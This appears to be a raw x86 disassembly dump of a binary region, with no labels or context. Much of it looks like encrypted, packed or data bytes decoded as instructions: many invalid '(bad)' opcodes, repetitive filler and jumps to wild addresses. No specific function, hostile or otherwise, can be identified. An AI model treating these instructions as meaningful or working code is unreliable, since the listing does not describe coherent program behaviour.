  41b7aa:	scas   eax,DWORD PTR es:[edi]
  41b7ab:	sub    ecx,DWORD PTR [eax-0x483f0359]
  41b7b1:	mov    eax,DWORD PTR [edx]
  41b7b3:	call   DWORD PTR [eax+0x8]
  41b7b6:	sub    bl,BYTE PTR [ecx]
  41b7b8:	or     BYTE PTR [ecx+ecx*2+0x5202e6d8],bh
  41b7bf:	mov    esi,0x8f088b58
  41b7c4:	and    ch,dh
  41b7c6:	sub    al,dl
  41b7c8:	rcl    BYTE PTR [eax],1
  41b7ca:	mov    eax,DWORD PTR [ecx]
  41b7cc:	push   ecx
  41b7cd:	inc    eax
  41b7ce:	xchg   ebx,eax
  41b7cf:	mov    al,0x2d
  41b7d1:	lock mov cl,0x28
  41b7d4:	je     0x41b7dc
  41b7d6:	sbb    eax,0xc189bd4c
  41b7db:	daa    
  41b7dc:	xor    eax,0x715a65c
  41b7e1:	shr    BYTE PTR [ecx],0x12
  41b7e4:	adc    dl,BYTE PTR [ecx]
  41b7e6:	jmp    DWORD PTR [ecx]
  41b7e8:	pop    eax
  41b7e9:	pop    eax
  41b7ea:	mov    eax,ds:0xf4ee8c35
  41b7ef:	lahf   
  41b7f0:	and    al,0xa
  41b7f2:	mov    edx,0x10b67660
  41b7f7:	xor    al,0xc
  41b7f9:	adc    BYTE PTR [edi],ch
  41b7fb:	fs jbe 0x41b7e1
  41b7fe:	and    dh,BYTE PTR [eax+eax*4+0x5]
  41b802:	mov    eax,0x150ac3c2
  41b807:	push   ss
  41b808:	sbb    BYTE PTR [eax+0xc],0x0
  41b80c:	aaa    
  41b80d:	mov    cl,0x0
  41b80f:	sbb    dh,ah
  41b811:	cmp    al,0xb3
  41b813:	push   esp
  41b814:	(bad)  
  41b815:	xor    al,0x22
  41b817:	mov    dh,0x4f
  41b819:	xor    BYTE PTR [eax-0x73],bh
  41b81c:	inc    ebx
  41b81d:	fild   WORD PTR [edi-0x2f5c7bf7]
  41b823:	sub    BYTE PTR [ebx+eax*8],al
  41b826:	or     DWORD PTR ds:0x4c46e28f,ecx
  41b82c:	push   eax
  41b82d:	xchg   DWORD PTR [ecx+0x655b84d],ecx
  41b833:	clc    
  41b834:	fs xor al,0xd2
  41b837:	push   ecx
  41b838:	mov    eax,0x3c6b072f
  41b83d:	jmp    0xa30aec38
  41b842:	xchg   DWORD PTR [ebp-0x2d40c8],edi
  41b848:	dec    DWORD PTR [edi]
  41b84a:	mov    bh,0x14
  41b84c:	dec    edx
  41b84d:	inc    ecx
  41b84e:	cmp    edx,0x7f
  41b851:	ja     0x41b859
  41b853:	mov    BYTE PTR [eax+esi*1],dl
  41b856:	inc    esi
  41b857:	jmp    0x41b8b2
  41b859:	cmp    edx,0x8d3176aa
  41b85f:	pop    esi
  41b860:	sbb    ecx,esi
  41b862:	das    
  41b863:	clc    
  41b864:	add    edi,DWORD PTR [ebx]
  41b866:	pop    ebp
  41b867:	cld    
  41b868:	ja     0x41b8be
  41b86a:	fcmovb st,st(1)
  41b86c:	jmp    0x41b87a
  41b86e:	or     bl,0xe0
  41b871:	mov    BYTE PTR [edx],bh
  41b873:	fdiv   QWORD PTR [edi+edi*4-0x7ff9eb03]
  41b87a:	jecxz  0x41b8bb
  41b87c:	sbb    al,BYTE PTR [eax+0x1305c88]
  41b882:	and    dl,0x12
  41b885:	retf   0x3054
  41b888:	add    bh,BYTE PTR [ebp-0x2bbaa4b6]
  41b88e:	jmp    0x41b8b0
  41b890:	pusha  
  41b891:	add    ah,BYTE PTR [edx]
  41b893:	dec    ebx
  41b894:	mov    edi,0x60a76399
  41b899:	rol    BYTE PTR [ebx+0x1],0x38
  41b89d:	dec    ebp
  41b89e:	or     BYTE PTR [ebx+0x5],dh
  41b8a1:	cmp    esi,DWORD PTR [ebp-0x52]
  41b8a4:	loopne 0x41b873
  41b8a6:	out    dx,al
  41b8a7:	cld    
  41b8a8:	jb     0x41b834
  41b8aa:	or     DWORD PTR [ebx+ecx*4],eax
  41b8ad:	dec    esi
  41b8ae:	mov    BYTE PTR [eax+esi*1],0x8
  41b8b2:	and    dh,BYTE PTR [ecx]
  41b8b4:	add    eax,0x1d8b072b
  41b8b9:	adc    cl,BYTE PTR ds:[eax+0x76]
  41b8bd:	or     al,BYTE PTR [edi]
  41b8bf:	ds or  bh,dh
  41b8c2:	in     al,dx
  41b8c3:	add    DWORD PTR [esi+0x0],eax
  41b8c6:	cmp    BYTE PTR [edx-0x1d],dh
  41b8c9:	lea    edx,[esi-0x40]
  41b8cc:	ret    0xb187
  41b8cf:	sbb    BYTE PTR [edi+0x8],ah
  41b8d2:	mov    bh,0xf0
  41b8d4:	fnstsw WORD PTR gs:[esi+eiz*1]
  41b8d8:	sbb    dh,BYTE PTR [edx+0x44f0d100]
  41b8de:	faddp  st(7),st
  41b8e0:	add    eax,0xe921682
  41b8e5:	pop    ecx
  41b8e6:	rcl    dh,0xee
  41b8e9:	cld    
  41b8ea:	retf   0x46e8
  41b8ed:	cmp    ah,dl
  41b8ef:	xor    esi,DWORD PTR [ecx+0xb]
  41b8f2:	pop    esp
  41b8f3:	jg     0x41b876
  41b8f5:	scas   al,BYTE PTR es:[edi]
  41b8f6:	cli    
  41b8f7:	mov    cl,BYTE PTR [edx+esi*1]
  41b8fa:	inc    esi
  41b8fb:	test   cl,0x80
  41b8fe:	stos   BYTE PTR es:[edi],al
  41b8ff:	or     al,0x8
  41b901:	(bad)  
  41b903:	mov    bh,0x1f
  41b905:	test   BYTE PTR [ebx+0x3fe18338],al
  41b90b:	and    BYTE PTR [eax],ah
  41b90d:	je     0x41b93d
  41b90f:	cmp    al,0x8a
  41b911:	adc    al,0x38
  41b913:	(bad)  
  41b915:	mov    edi,0x80da8b38
  41b91a:	jecxz  0x41b8dc
  41b91c:	cmp    bl,0x80
  41b91f:	jne    0xdaf404e0
  41b925:	jg     0x41b934
  41b927:	cmp    al,0x98
  41b929:	and    edx,0x6e1c1f8
  41b92f:	or     edx,ecx
  41b931:	mov    ecx,edx
  41b933:	pop    ebx
  41b934:	sar    BYTE PTR [edi+0x17],1
  41b937:	cmp    ecx,DWORD PTR [ebp+0x4d4a6649]
  41b93d:	cld    
  41b93e:	mov    WORD PTR [ecx+eax*2],dx
  41b942:	mov    bl,0xc0
  41b944:	jle    0x41b8e3
  41b946:	pop    eax
  41b947:	push   ebp
  41b948:	adc    BYTE PTR [edx+eax*2],cl
  41b94b:	inc    eax
  41b94c:	call   0xdc3b:0x5d3b09d6
  41b953:	loopne 0x41b8d7
  41b955:	jo     0x41b99b
  41b957:	adc    BYTE PTR [eax],dl
  41b959:	or     BYTE PTR [eax+0x3d],cl
  41b95c:	(bad)  
  41b95d:	cmp    DWORD PTR [eax-0x23],edi
  41b960:	lds    eax,FWORD PTR [edx+eax*2]
  41b963:	and    al,0x47
  41b965:	inc    ebx
  41b966:	inc    edx
  41b967:	mov    bh,0x4c
  41b969:	ret    0x293
  41b96c:	mov    ebx,0x352130ae
  41b971:	scas   al,BYTE PTR es:[edi]
  41b972:	sbb    BYTE PTR [esp+edx*1-0x65],al
  41b976:	pop    eax
  41b977:	mul    DWORD PTR [esi+0x1c]
  41b97a:	in     al,0xfa
  41b97c:	xor    BYTE PTR [ebp+0x1e],0x37
  41b980:	sbb    DWORD PTR [edi],esp
  41b982:	or     al,bh
  41b984:	mov    cl,0x13
  41b986:	dec    edi
  41b987:	mov    eax,0xab40be72
  41b98c:	jge    0x41b948
  41b98e:	adc    al,0x4
  41b990:	enter  0xd6ef,0x31
  41b994:	loope  0x41b93a
  41b996:	inc    ebx
  41b997:	jbe    0x41b974
  41b999:	(bad)  
  41b99a:	push   ebp
  41b99b:	(bad)  
  41b99c:	jno    0x41b950
  41b99e:	not    BYTE PTR [edx+0x64e84c3]
  41b9a4:	retf   0x145e
  41b9a7:	add    DWORD PTR [eax-0x3e],esp
  41b9aa:	pop    esi
  41b9ab:	sbb    DWORD PTR [ebp+0x66c10c14],ecx
  41b9b1:	dec    DWORD PTR [ebx+ebx*8+0x23]
  41b9b5:	sbb    al,0x1f
  41b9b7:	das    
  41b9b8:	inc    esp
  41b9b9:	inc    eax
  41b9ba:	push   eax
  41b9bb:	and    eax,DWORD PTR [esi+eiz*2]
  41b9be:	xchg   edi,eax
  41b9bf:	pop    esp
  41b9c0:	dec    edi
  41b9c1:	xor    DWORD PTR [esi+edi*2],esi
  41b9c4:	add    BYTE PTR [edx-0x28],0x83
  41b9c8:	xchg   edi,eax
  41b9c9:	sbb    eax,0xd08b0df6
  41b9ce:	dec    edx
  41b9cf:	outs   dx,DWORD PTR ds:[esi]
  41b9d0:	jmp    0x41b9da
  41b9d2:	adc    edi,DWORD PTR [esi+eax*8-0x3570cc38]
  41b9d9:	inc    ecx
  41b9da:	jmp    0x41b981
  41b9dc:	xchg   esi,eax
  41b9dd:	push   ebp
  41b9de:	cmp    eax,0x858b12e
  41b9e3:	adc    DWORD PTR [edi],ebp
  41b9e5:	xchg   ebp,eax
  41b9e6:	xchg   esi,eax
  41b9e7:	mov    esp,0x56335708
  41b9ec:	mov    cs,WORD PTR [eax+esi*2+0x70]
  41b9f0:	cmp    BYTE PTR [ebp+ebx*2+0x5ed81201],0xb0
  41b9f8:	cmp    ebp,esi
  41b9fa:	test   DWORD PTR [edx+0x14344721],ecx
  41ba00:	pop    ds
  41ba01:	or     al,0x13
  41ba03:	dec    esp
  41ba04:	xor    al,0x23
  41ba06:	add    al,0x47
  41ba08:	inc    ebx
  41ba09:	mov    ah,0x43
  41ba0b:	push   es
  41ba0c:	jns    0x41ba2e
  41ba0e:	xor    al,0xf0
  41ba10:	xor    cl,BYTE PTR [eax+0x6]
  41ba13:	jns    0x41b9dd
  41ba15:	xor    ah,ah
  41ba17:	cmp    dl,BYTE PTR [esi+0x32]
  41ba1a:	ss (bad) 
  41ba1c:	or     eax,0xaf5c8399
  41ba21:	xor    esi,esp
  41ba23:	in     al,0x90
  41ba25:	scas   eax,DWORD PTR es:[edi]
  41ba26:	add    DWORD PTR [ecx],eax
  41ba28:	(bad)  
  41ba29:	sahf   
  41ba2a:	inc    esp
  41ba2b:	in     al,dx
  41ba2c:	mov    cl,BYTE PTR [ebx]
  41ba2e:	test   eax,0x3942365
  41ba33:	shl    BYTE PTR [esi-0x2e],cl
  41ba36:	xor    esi,DWORD PTR [ebp+0x3d]
  41ba39:	cmp    DWORD PTR [ebx+0x2a],0x372a7d42
  41ba40:	push   ds
  41ba41:	xor    ecx,DWORD PTR [esi+0x6c]
  41ba44:	mov    ds:0x13fb038b,eax
  41ba49:	aam    0x8c
  41ba4b:	mov    al,0x3b
  41ba4d:	mov    WORD PTR [ebx-0x3a],fs
  41ba50:	enter  0xcf9e,0x83
  41ba54:	cmovo  eax,esi
  41ba57:	xor    ecx,DWORD PTR [edx]
  41ba59:	adc    BYTE PTR [ebx+0x4],0x2e
  41ba5d:	fdiv   DWORD PTR [esi+eax*4-0x4d]
  41ba61:	mov    al,ds:0x5fae6996
  41ba66:	aas    
  41ba67:	or     al,0xa3
  41ba69:	mov    eax,ds:0x4e0684b8
  41ba6e:	push   edi
  41ba6f:	or     esp,DWORD PTR [edi-0x3]
  41ba72:	daa    
  41ba73:	push   0x7
  41ba75:	lea    edx,[ebp-0xb]
  41ba78:	push   edx
  41ba79:	push   0xaf407bf6
  41ba7e:	loopne 0x41ba87
  41ba80:	xor    al,dh
  41ba82:	and    bh,BYTE PTR [ecx-0x25dfe10e]
  41ba88:	xchg   ebx,esi
  41ba8a:	das    
  41ba8b:	sbb    BYTE PTR [ebx-0x2715e3df],cl
  41ba91:	repnz sub ah,dl
  41ba94:	xor    cl,BYTE PTR [ebx]
  41ba96:	push   0x7d
  41ba98:	push   ebp
  41ba99:	push   edi
  41ba9a:	pop    esp
  41ba9b:	es or  al,0xa4
  41ba9e:	lock jnp 0x41ba87
  41baa1:	sub    esi,ecx
  41baa3:	and    BYTE PTR [ebx],bh
  41baa5:	daa    
  41baa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baa7:	push   edi
  41baa8:	inc    DWORD PTR ds:0x237532b4
  41baae:	add    DWORD PTR [edi],0xb0b8899d
  41bab4:	jbe    0x41ba8e
  41bab6:	in     al,dx
  41bab7:	fwait
  41bab8:	mov    esp,0xe01370bd
  41babd:	arpl   WORD PTR [eax],cx
  41babf:	or     edi,DWORD PTR [eax-0x48f04541]
  41bac5:	jae    0x41ba74
  41bac7:	scas   eax,DWORD PTR es:[edi]
  41bac8:	clc    
  41bac9:	sub    DWORD PTR ds:0x5420185,0x7e
  41bad1:	stos   BYTE PTR es:[edi],al
  41bad2:	sbb    ch,al
  41bad4:	mov    BYTE PTR ds:0xdf02e608,0x65
  41badb:	pop    ebx
  41badc:	adc    eax,0x60463467
  41bae1:	add    BYTE PTR [eax],ah
  41bae3:	test   al,0x48
  41bae5:	mov    edx,0xa630c8b3
  41baea:	and    BYTE PTR [ecx+edx*1],ch
  41baed:	pop    esp
  41baee:	fbld   TBYTE PTR [edi+0x660112b5]
  41baf4:	cmp    cl,BYTE PTR [eax+esi*4-0x29]
  41baf8:	adc    BYTE PTR [eax],bl
  41bafa:	(bad)
  41baff:	in     al,0x63
  41bb01:	adc    DWORD PTR [ebx+eiz*4+0x12b04d3c],esi
  41bb08:	fidivr WORD PTR [esi]
  41bb0a:	add    dh,BYTE PTR [ebx+eiz*4+0x38]
  41bb0e:	adc    ebp,DWORD PTR [ebp+eiz*1-0x4b]
  41bb12:	mov    ds:0x8fcad655,eax
  41bb17:	sub    eax,0x2766cf21
  41bb1c:	xchg   BYTE PTR [edx-0x4789c9b2],bl
  41bb22:	cdq    
  41bb23:	jmp    0x41bb45
  41bb25:	fisttp QWORD PTR [ebx]
  41bb27:	rcl    DWORD PTR [ecx],0xa7
  41bb2a:	in     al,dx
  41bb2b:	in     al,0xa3
  41bb2d:	sub    BYTE PTR ds:0x20a42ddc,ch
  41bb33:	emms   
  41bb35:	mov    fs:0xa0a6dc30,eax
  41bb3b:	outs   dx,BYTE PTR ds:[esi]
  41bb3c:	scas   eax,DWORD PTR es:[edi]
  41bb3d:	jmp    DWORD PTR ds:0xfcc6fd0
  41bb43:	enter  0x6b8c,0xbc
  41bb47:	pushf  
  41bb48:	les    edx,FWORD PTR [eax+0x6a]
  41bb4b:	or     BYTE PTR [eax+0x5e],0x58
  41bb4f:	sbb    ch,BYTE PTR ds:0x8eaeb8ef
  41bb55:	test   DWORD PTR [edi-0x53dc1701],eax
  41bb5b:	inc    ebp
  41bb5c:	cmp    DWORD PTR ss:0x8ff0c98,0x1f
  41bb64:	dec    ebp
  41bb65:	sub    cl,al
  41bb67:	loop   0x41bb50
  41bb69:	dec    eax
  41bb6a:	mov    al,ds:0x55a7dd74
  41bb6f:	fimul  WORD PTR [ecx+ebp*1]
  41bb72:	jmp    0x41bb80
  41bb74:	push   eax
  41bb75:	mov    eax,ds:0x98375053
  41bb7a:	mov    edi,0x2877401b
  41bb7f:	mov    cl,BYTE PTR ds:0x84250e5c
  41bb85:	leave  
  41bb86:	jne    0x41bbae
  41bb88:	mov    edx,DWORD PTR fs:[eax+0x15c2f5f6]
  41bb8f:	sub    al,0x2f
  41bb91:	cmp    BYTE PTR [ecx-0x4c],0x57
  41bb95:	fmul   DWORD PTR [ebx-0x8]
  41bb98:	add    edi,DWORD PTR [edx]
  41bb9a:	add    ebx,eax
  41bb9c:	mov    eax,ds:0x31215668
  41bba1:	mov    edx,0xc3dbfdc2
  41bba6:	mov    eax,0x703e409c
  41bbab:	outs   dx,BYTE PTR ds:[esi]
  41bbac:	mov    ebp,0xabb79c33
  41bbb1:	arpl   WORD PTR [ecx+0x60a38048],di
  41bbb7:	fldlg2 
  41bbb9:	(bad)  
  41bbbb:	mov    bh,0x9
  41bbbd:	mov    ds:0xa4382aa0,eax
  41bbc2:	or     eax,0xc2ec69a8
  41bbc7:	pop    es
  41bbc8:	out    dx,al
  41bbc9:	dec    ecx
  41bbca:	cmp    BYTE PTR [edx+0xc2a517d],bh
  41bbd0:	out    0x71,eax
  41bbd2:	fsub   QWORD PTR [ebx+edi*2]
  41bbd5:	pop    edi
  41bbd6:	mov    cl,0x59
  41bbd8:	fs jle 0x41bbf0
  41bbdb:	loopne 0x41bb7b
  41bbdd:	mov    al,0xe4
  41bbdf:	mov    eax,0x3d2dc659
  41bbe4:	add    esi,DWORD PTR [edx-0x37]
  41bbe7:	dec    ebp
  41bbe8:	xor    BYTE PTR [edi-0x17],ch
  41bbeb:	ins    BYTE PTR es:[edi],dx
  41bbec:	lock pop ebp
  41bbee:	aam    0x72
  41bbf0:	and    al,0x6c
  41bbf2:	jbe    0x41bc66
  41bbf4:	pushf  
  41bbf5:	pushf  
  41bbf6:	fsub   QWORD PTR [edx]
  41bbf8:	addps  xmm2,XMMWORD PTR [eax+edx*2-0x64]
  41bbfd:	pushf  
  41bbfe:	pushf  
  41bbff:	pushf  
  41bc00:	dec    esp
  41bc01:	dec    eax
  41bc02:	inc    esp
  41bc03:	inc    eax
  41bc04:	pushf  
  41bc05:	pushf  
  41bc06:	pushf  
  41bc07:	pushf  
  41bc08:	cmp    al,0x38
  41bc0a:	xor    al,0x30
  41bc0c:	pushf  
  41bc0d:	pushf  
  41bc0e:	pushf  
  41bc0f:	pushf  
  41bc10:	sub    al,0x28
  41bc12:	and    al,0x20
  41bc14:	pushf  
  41bc15:	pushf  
  41bc16:	pushf  
  41bc17:	pushf  
  41bc18:	sbb    al,0x18
  41bc1a:	adc    al,0x10
  41bc1c:	pushf  
  41bc1d:	pushf  
  41bc1e:	pushf  
  41bc1f:	pushf  
  41bc20:	or     al,0x8
  41bc22:	add    al,0x0
  41bc24:	dec    esi
  41bc25:	dec    esi
  41bc26:	inc    esi
  41bc27:	sahf   
  41bc28:	cld    
  41bc29:	jno    0x41bc23
  41bc2b:	hlt    
  41bc2c:	lock dec esi
  41bc2e:	dec    esi
  41bc2f:	dec    esi
  41bc30:	dec    esi
  41bc31:	in     al,dx
  41bc32:	call   0x4f659d1b
  41bc37:	dec    esi
  41bc38:	dec    esi
  41bc39:	(bad)  
  41bc3b:	mov    al,0x72
  41bc3d:	lods   al,BYTE PTR ds:[esi]
  41bc3e:	daa    
  41bc3f:	daa    
  41bc40:	daa    
  41bc41:	daa    
  41bc42:	test   al,0xa4
  41bc44:	mov    al,ds:0x2727279c
  41bc49:	daa    
  41bc4a:	cwde   
  41bc4b:	xchg   esp,eax
  41bc4c:	nop
  41bc4d:	mov    WORD PTR [edi],fs
  41bc4f:	daa    
  41bc50:	daa    
  41bc51:	daa    
  41bc52:	mov    BYTE PTR [eax+eax*4+0x2727277c],al
  41bc59:	daa    
  41bc5a:	js     0x41bcd0
  41bc5c:	jo     0x41bcca
  41bc5e:	daa    
  41bc5f:	daa    
  41bc60:	daa    
  41bc61:	daa    
  41bc62:	push   0x27d0d8d4
  41bc67:	daa    
  41bc68:	daa    
  41bc69:	daa    
  41bc6a:	int3   
  41bc6b:	enter  0xc0c4,0x77
  41bc6f:	sub    al,0x27
  41bc71:	daa    
  41bc72:	mov    esp,0x24195fb8
  41bc77:	pop    es
  41bc78:	fs xchg edx,eax
  41bc7a:	pop    esp
  41bc7b:	jo     0x41bc9d
  41bc7d:	pop    esp
  41bc7e:	(bad)  [edx-0x668fcd2f]
  41bc84:	lock fmul QWORD PTR [edi]
  41bc87:	icebp  
  41bc88:	daa    
  41bc89:	daa    
  41bc8a:	daa    
  41bc8b:	daa    
  41bc8c:	repnz repz hlt 
  41bc8f:	cmc    
  41bc90:	daa    
  41bc91:	daa    
  41bc92:	daa    
  41bc93:	daa    
  41bc94:	div    bh
  41bc96:	clc    
  41bc97:	stc    
  41bc98:	daa    
  41bc99:	daa    
  41bc9a:	daa    
  41bc9b:	daa    
  41bc9c:	cli    
  41bc9d:	sti    
  41bc9e:	cld    
  41bc9f:	std    
  41bca0:	daa    
  41bca1:	daa    
  41bca2:	daa    
  41bca3:	daa    
  41bca4:	(bad)  
  41bca5:	jmp    eax
  41bca7:	loope  0x41bcd0
  41bca9:	daa    
  41bcaa:	daa    
  41bcab:	daa    
  41bcac:	loop   0x41bc91
  41bcae:	in     al,0xe5
  41bcb0:	daa    
  41bcb1:	daa    
  41bcb2:	daa    
  41bcb3:	daa    
  41bcb4:	out    0xe7,al
  41bcb6:	call   0x2768e4a4
  41bcbb:	daa    
  41bcbc:	jmp    0x2727:0x27edeceb
  41bcc3:	daa    
  41bcc4:	out    dx,al
  41bcc5:	out    dx,eax
  41bcc6:	rcl    cl,1
  41bcc8:	daa    
  41bcc9:	daa    
  41bcca:	daa    
  41bccb:	daa    
  41bccc:	rcl    bl,cl
  41bcce:	aam    0xd5
  41bcd0:	daa    
  41bcd1:	daa    
  41bcd2:	daa    
  41bcd3:	daa    
  41bcd4:	(bad)  
  41bcd5:	xlat   BYTE PTR ds:[ebx]
  41bcd6:	fcomp  st(1)
  41bcd8:	daa    
  41bcd9:	daa    
  41bcda:	daa    
  41bcdb:	daa    
  41bcdc:	fcmovu st,st(3)
  41bcde:	(bad)  
  41bce0:	daa    
  41bce1:	daa    
  41bce2:	daa    
  41bce3:	daa    
  41bce4:	(bad)  
  41bce6:	rol    cl,0x27
  41bce9:	daa    
  41bcea:	daa    
  41bceb:	daa    
  41bcec:	ret    0xc4c3
  41bcef:	lds    esp,FWORD PTR [edi]
  41bcf1:	daa    
  41bcf2:	daa    
  41bcf3:	daa    
  41bcf4:	mov    bh,0xc8
  41bcf7:	leave  
  41bcf8:	daa    
  41bcf9:	daa    
  41bcfa:	daa    
  41bcfb:	daa    
  41bcfc:	retf   0xcccb
  41bcff:	int    0x93
  41bd01:	xchg   ebx,eax
  41bd02:	xchg   ebx,eax
  41bd03:	and    eax,DWORD PTR [eax]
  41bd05:	into   
  41bd06:	iret   
  41bd07:	mov    al,0x93
  41bd09:	xchg   ebx,eax
  41bd0a:	xchg   ebx,eax
  41bd0b:	xchg   ebx,eax
  41bd0c:	mov    cl,0xb2
  41bd0e:	mov    bl,0xb4
  41bd10:	xchg   ebx,eax
  41bd11:	xchg   ebx,eax
  41bd12:	xchg   ebx,eax
  41bd13:	xchg   ebx,eax
  41bd14:	mov    ch,0xb6
  41bd16:	mov    bh,0xb8
  41bd18:	xchg   ebx,eax
  41bd19:	xchg   ebx,eax
  41bd1a:	xchg   ebx,eax
  41bd1b:	xchg   ebx,eax
  41bd1c:	mov    ecx,0x93bcbbba
  41bd21:	xchg   ebx,eax
  41bd22:	xchg   ebx,eax
  41bd23:	xchg   ebx,eax
  41bd24:	mov    ebp,0x93a0bfbe
  41bd29:	xchg   ebx,eax
  41bd2a:	xchg   ebx,eax
  41bd2b:	xchg   ebx,eax
  41bd2c:	mov    eax,ds:0x93a4a3a2
  41bd31:	xchg   ebx,eax
  41bd32:	xchg   ebx,eax
  41bd33:	xchg   ebx,eax
  41bd34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd37:	test   al,0x64
  41bd39:	xchg   edx,eax
  41bd3a:	aaa    
  41bd3b:	popf   
  41bd3c:	test   eax,0x745f210f
  41bd41:	out    dx,al
  41bd42:	xor    ah,BYTE PTR [edi+eax*1]
  41bd45:	sub    BYTE PTR [edi+0x74],bl
  41bd48:	sub    BYTE PTR [esi],0x87
  41bd4b:	push   cs
  41bd4c:	jmp    0x41bd10
  41bd4e:	add    DWORD PTR [esi],edx
  41bd50:	addr16 xchg edx,eax
  41bd52:	pop    edi
  41bd53:	setp   BYTE PTR [ebp+eiz*1-0x66fff1b1]
  41bd5b:	lods   al,BYTE PTR ds:[esi]
  41bd5c:	adc    BYTE PTR [ecx-0x1d],bl
  41bd5f:	mov    ebx,0xffc0ed65
  41bd64:	or     DWORD PTR [ebp+0x78],eax
  41bd67:	arpl   WORD PTR [ebp+0x70],sp
  41bd6a:	je     0x41bdd5
  41bd6c:	outs   dx,DWORD PTR ds:[esi]
  41bd6d:	outs   dx,BYTE PTR ds:[esi]
  41bd6e:	xor    cl,BYTE PTR [edi+0x379f21fc]
  41bd74:	inc    ebp
  41bd75:	pop    ds
  41bd76:	call   0x5f75ce49
  41bd7b:	jge    0x41bd69
  41bd7d:	dec    edi
  41bd7e:	dec    esi
  41bd7f:	les    esp,FWORD PTR [ebx+0x61654845]
  41bd85:	jo     0x41bd3c
  41bd87:	nop
  41bd88:	inc    esp
  41bd89:	pusha  
  41bd8a:	stc    
  41bd8b:	outs   dx,BYTE PTR ds:[esi]
  41bd8c:	push   eax
  41bd8d:	xlat   BYTE PTR gs:[ebx]
  41bd8f:	ds mov bh,0x9c
  41bd92:	adc    esi,edi
  41bd94:	jmp    FWORD PTR [edx]
  41bd96:	or     al,0x45
  41bd98:	dec    edi
  41bd99:	jne    0x41be0f
  41bd9b:	dec    edi
  41bd9c:	dec    bp
  41bd9e:	gs ins DWORD PTR es:[edi],dx
  41bda0:	outs   dx,DWORD PTR ds:[esi]
  41bda1:	jb     0x41be1c
  41bda3:	mov    fs,WORD PTR [ecx-0x3f]
  41bda6:	sub    eax,0x3eb7a05a
  41bdab:	outs   dx,DWORD PTR ds:[esi]
  41bdac:	pop    edx
  41bdad:	sti    
  41bdae:	jge    0x41bd5a
  41bdb0:	aas    
  41bdb1:	or     eax,DWORD PTR [ebp+0x49]
  41bdb4:	outs   dx,BYTE PTR ds:[esi]
  41bdb5:	mov    edx,0xb6727245
  41bdba:	clc    
  41bdbb:	scas   eax,DWORD PTR es:[edi]
  41bdbc:	xor    BYTE PTR [eax+eax*2-0x293507d2],ch
  41bdc3:	test   ebp,ecx
  41bdc5:	push   0x16
  41bdc7:	je     0x41bd4f
  41bdc9:	popa   
  41bdca:	ins    BYTE PTR es:[edi],dx
  41bdcb:	mov    esi,0xe4a9af61
  41bdd0:	ja     0x41bd5b
  41bdd2:	ds scas eax,DWORD PTR es:[edi]
  41bdd4:	lods   al,BYTE PTR ds:[esi]
  41bdd5:	pusha  
  41bdd6:	mov    ds:0x1290c34d,al
  41bddb:	xlat   BYTE PTR ds:[ebx]
  41bddc:	mov    al,0xbf
  41bdde:	ret    
  41bddf:	loope  0x41bdeb
  41bde1:	in     al,0xb0
  41bde3:	or     DWORD PTR [esi],ebx
  41bde5:	sbb    edi,DWORD PTR [ebx+0x6e20b244]
  41bdeb:	or     BYTE PTR [edx+0x3e],ah
  41bdee:	scas   eax,DWORD PTR es:[edi]
  41bdef:	cld    
  41bdf0:	call   DWORD PTR [edx+esi*8+0x64]
  41bdf4:	popa   
  41bdf5:	or     al,BYTE PTR [ebp+0x44]
  41bdf8:	imul   esi,DWORD PTR [esi+0x42],0x72655a79
  41bdff:	outs   dx,DWORD PTR ds:[esi]
  41be00:	nop
  41be01:	pusha  
  41be02:	bound  eax,QWORD PTR ds:0xe4609172
  41be08:	mov    ds:0x527ebe5d,al
  41be0d:	popa   
  41be0e:	outs   dx,BYTE PTR ds:[esi]
  41be0f:	addr16 gs mov eax,0x66feb8af
  41be16:	(bad)  
  41be17:	or     ah,dh
  41be19:	dec    ecx
  41be1a:	outs   dx,BYTE PTR ds:[esi]
  41be1b:	jbe    0x41be82
  41be1d:	jb     0x41be85
  41be1f:	ins    BYTE PTR es:[edi],dx
  41be20:	outs   dx,DWORD PTR ds:[esi]
  41be21:	ja     0x41be63
  41be23:	dec    esi
  41be24:	xor    al,0x7c
  41be26:	adc    al,0x63
  41be28:	(bad)  
  41be29:	adc    al,0x63
  41be2b:	rol    BYTE PTR [eax],0x34
  41be2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be2f:	push   ss
  41be30:	dec    ebp
  41be31:	mov    esp,fs
  41be33:	leave  
  41be34:	inc    ebp
  41be35:	sti    
  41be36:	gs nop
  41be38:	ins    BYTE PTR es:[edi],dx
  41be39:	scas   eax,DWORD PTR es:[edi]
  41be3a:	ins    BYTE PTR es:[edi],dx
  41be3b:	enter  0xfb62,0x1d
  41be3f:	pop    es
  41be40:	stos   DWORD PTR es:[edi],eax
  41be41:	data16 jbe 0x41be74
  41be44:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x86afc490
  41be4c:	adc    eax,0xc6c445c8
  41be51:	mov    ds:0x6d1616dd,al
  41be56:	jle    0x41be0a
  41be58:	gs sbb al,0x64
  41be5b:	scas   eax,DWORD PTR es:[edi]
  41be5c:	and    DWORD PTR [ebx],0x5
  41be5f:	jb     0x41be7d
  41be61:	fs (bad) 
  41be63:	sar    DWORD PTR [eax-0x29f714bb],0x74
  41be6a:	scas   eax,DWORD PTR es:[edi]
  41be6b:	ds mov ah,0xb3
  41be6e:	scas   eax,DWORD PTR es:[edi]
  41be6f:	pusha  
  41be70:	andnps xmm5,XMMWORD PTR [esi+0x64]
  41be74:	mov    cl,0x90
  41be76:	int3   
  41be77:	scas   eax,DWORD PTR es:[edi]
  41be78:	sbb    al,0x41
  41be7a:	sbb    BYTE PTR [ebx+0x3e],0xf
  41be7e:	paddsw mm6,QWORD PTR [ebp+0x50bf30f5]
  41be85:	outs   dx,DWORD PTR ds:[esi]
  41be86:	imul   edx,DWORD PTR [eax],0x2eb76528
  41be8c:	loopne 0x41be78
  41be8e:	adc    bh,BYTE PTR [edi]
  41be90:	or     al,0x5f
  41be92:	or     al,0x17
  41be94:	in     eax,dx
  41be95:	jecxz  0x41be5a
  41be97:	mov    bh,0x43
  41be99:	popa   
  41be9a:	jae    0x41bf10
  41be9c:	fiadd  WORD PTR [edi+esi*4+0x57d70784]
  41bea3:	and    BYTE PTR ds:0xd24a4345,cl
  41bea9:	je     0x41be36
  41beab:	ss push esp
